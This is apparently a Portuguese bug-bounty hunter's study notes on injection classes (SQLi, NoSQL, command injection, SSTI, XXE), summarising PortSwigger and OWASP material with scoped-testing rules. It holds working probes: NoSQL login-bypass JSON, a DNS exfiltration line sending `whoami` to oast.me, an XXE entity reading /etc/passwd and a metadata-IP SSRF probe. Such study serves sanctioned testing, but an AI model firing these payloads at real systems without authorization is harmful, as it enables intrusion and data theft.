# Injecao (SQLi, NoSQLi, CMDi, SSTI, XXE) — DEEP STUDY

Status: **deep study 2026-07-12**.  
Nivel tipico: **2** (payload pontual). Fuzz amplo / sqlmap agressivo = **2 alto–3**. Billion Laughs / DoS via XXE = **OOS** na maioria dos programas.

## Log do que foi lido nesta sessao

| Fonte | O que absorvi |
|-------|----------------|
| PortSwigger SQLi (pagina completa) | WHERE/UPDATE/INSERT/ORDER BY; hidden data; login logic; UNION; blind boolean/time/OAST; second-order; JSON/XML encoding WAF |
| PortSwigger NoSQL | Syntax vs operator injection; Mongo `$ne`/`$in`/`$regex`/`$where`; URL `user[$ne]=` vs JSON nested; timing `sleep` |
| PortSwigger OS command injection | Separators `&|&&||;` + `` ` ``/`$()`; blind time/redirect-to-webroot/OAST DNS |
| PortSwigger SSTI | Detect fuzz `${{<%[%'"}}%\`; plaintext vs code context; identify engine (Twig vs Jinja `{{7*'7'}}`); RCE tipico |
| PortSwigger XXE | File retrieve; XXE→SSRF; blind OOB/error; XInclude; SVG/DOCX upload; Content-Type→XML |
| PAT: SQL / NoSQL / Command / SSTI / XXE READMEs | Entry detect; operators; filter bypass; tools sqlmap/commix/tplmap; SVG/SOAP/DOCX |
| WSTG-INPV: SQLi/NoSQL/Command/SSTI (18) / Code | Objetivos de teste alinhados |
| Guia study 4.1 | Headers/sort; `$ne` object; math probe SSTI; OAST XXE |
| VRT | SQLi **P1**; RCE **P1**; Command Injection **P1**; XXE **P1**; SSTI Basic **P4** / Custom case-by-case |
| Bugcrowd University XXE + XSS PDFs | Presentes em `bugcrowd_university/` (pdftotext ausente nesta VM — nao extraidos ASCII nesta sessao) |

## Modelo mental unico

Input do usuario deixa de ser **dado** e vira **instrucao** do interpretador (SQL, Mongo query, shell, template, XML parser).

| Classe | Interpretador | Probe minimo | Impacto tipico |
|--------|---------------|--------------|----------------|
| SQLi | SQL DB | `'` + boolean/time | Dump / ATO / RCE raro |
| NoSQLi | Mongo/etc | `{"$ne":null}` / `'\|\|'1'=='1` | Auth bypass / dump |
| CMDi | Shell OS | `; id` / `& ping -c 10` | RCE |
| SSTI | Template engine | `{{7*7}}` / `${7*7}` | RCE |
| XXE | XML parser | ENTITY file:// / OAST | File / SSRF |

## SQLi

### Onde

Query string, body JSON/XML, cookies, headers (`X-Forwarded-For`, `User-Agent`), sort/filter/order de API, second-order (perfil → export/report).

### Detect (PortSwigger + PAT)

1. `'` `"` `;` `)` — erro / anomalia.
2. Condicoes true/false sistematicas (`OR 1=1` vs `OR 1=2`) — **cuidado**: pode atingir UPDATE/DELETE.
3. Time (`SLEEP`/`WAITFOR`/`pg_sleep`).
4. OAST (DNS/HTTP) quando nao ha oraculo.

### Explorar

- Comment `--` / `#` pra dropar `AND released=1` ou check de password.
- UNION: alinhar colunas/tipos; cheat sheet PS por DBMS.
- Blind: boolean bit a bit; time; OAST exfil.
- Second-order: gravar payload “seguro” no insert; trigger no consumo.

### Defesa (pra report/remediacao)

Prepared statements com constante hard-coded; whitelist em ORDER BY/table names.

### Tool

`sqlmap` na VM (`/usr/bin/sqlmap`). Em bounty: so apos hipotese, rate baixo, `-p` unico, sem dump cego de DB inteira se policy restringe.

## NoSQLi (Mongo foco)

### Operator injection

JSON: `{"username":{"$ne":"x"},"password":{"$ne":"x"}}` → login primeiro user.  
URL: `username[$ne]=invalid`. Se falhar: GET→POST + `Content-Type: application/json`.

Operadores uteis: `$ne`, `$gt`, `$in`, `$regex`, `$where`, `$nin`.

### Syntax injection

Quebrar string JS-like `this.category == '...'` com `'||'1'=='1` ou null byte truncando `&& this.released`.

### Extracao

`$where` / JS char-by-char; `$regex` em password; timing `sleep(5000)`.

Nao confundir com GraphQL batch — mesmo `$` mas contexto DB.

## OS Command Injection

### Onde

Conversao imagem/PDF, ping/traceroute embutido, mail CLI, relatorios, “tools” admin.

### Inject

Unix+Win separators: `&` `&&` `|` `||`  
Unix: `;` newline `` `cmd` `` `$(cmd)`  
Se input esta entre aspas: fechar `"`/`'` antes.

### Blind

- Time: `ping -c 10 127.0.0.1`
- Redirect: `whoami > /var/www/static/x.txt` (se webroot conhecido)
- OAST: `nslookup \`whoami\`.oast.me`

Nunca “sanitizar” metacharacters com escape caseiro (PS: frágil).

PAT: bypass sem espaco (`{cat,flag}`), quotes, `$IFS`, hex, wildcards — usar so se blacklist bloqueia.

## SSTI

### Detect

1. Fuzz: `${{<%[%'"}}%\`
2. Math no plaintext: `{{7*7}}` → `49`; `${7*7}`; `#{7*7}`; `<%= 7*7 %>`
3. Code context: quebrar `}}` / fechar expressao + HTML

### Identify

Decision tree PS: mesmo payload pode significar engines diferentes — `{{7*'7'}}` → `49` Twig vs `7777777` Jinja2. Erro de sintaxe invalida muitas vezes nomeia a engine.

### Exploit

Apos engine: gadgets RCE (Jinja/Twig/FreeMarker/ERB…). tplmap/SSTImap/TInjA se instalados; senao payloads PAT por engine.

WSTG: wiki/CMS/email personalizado = superficie quente.

VRT: SSTI “Basic” P4; RCE comprovado → tratar como RCE **P1**.

## XXE

### Classico

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
...
<productId>&xxe;</productId>
```

Testar **cada** no de dados refletido na resposta.

### SSRF via XXE

ENTITY com `http://169.254.169.254/` ou interno — liga com nota SSRF.

### Blind

OAST Collaborator/interactsh; error-based com DTD local/remoto.

### Superficie escondida

- **XInclude** quando so controla um valor embutido em SOAP/XML server-side.
- Upload **SVG**/DOCX/XLSX (XML por dentro).
- Trocar `Content-Type` form → `text/xml` e reenviar body XML.

Billion Laughs = DoS → quase sempre OOS.

VRT XXE **P1** (tipicamente file/SSRF significativo).

## Nivel de agressividade

| Acao | Nivel |
|------|-------|
| `'` / `$ne` / `{{7*7}}` / ENTITY file pontual | 2 |
| sqlmap/commix pontual 1 param | 2 |
| sqlmap dump / fuzz todos params alta concorrencia | 3 + policy |
| XXE billion laughs / CMDi flood | OOS |

## Aplicacao em hunting

- Em APIs JSON/GraphQL tipadas, SQLi classico pode ser menos comum que BAC, mas
  sort/search/export continuam candidatos.
- Injection vira relevante em search, export, webhooks, upload/parse, admin
  tools e integrações.
- Sempre: 1 hipotese → 1 param → evidencia → pivot. Nao “matriz de 50
  payloads” sem oraculo.

## PoC minimo (generico)

1. Oraculo claro (erro / boolean / time / OAST / math 49).
2. Payload minimo que prova classe.
3. Escalada so ate impacto reportavel (1 arquivo, 1 whoami, 1 row) — nao destruir.
4. Controle negativo (input normal).

## Fontes

- https://portswigger.net/web-security/sql-injection (+ blind, union, cheat sheet)
- https://portswigger.net/web-security/nosql-injection
- https://portswigger.net/web-security/os-command-injection
- https://portswigger.net/web-security/server-side-template-injection
- https://portswigger.net/web-security/xxe
- PAT pastas SQL/NoSQL/Command/SSTI/XXE
- WSTG-INPV-05/05.6/12/18 + XXE chapters
- VRT Server-Side Injection + Command Injection P1
- BC Univ: `bugcrowd_university/XML External Entity Injection/` (PDF)

## Proxima deep sugerida

Client-side (esta sessao em paralelo) → depois recon (takeover/discovery) ou smuggling/cache.
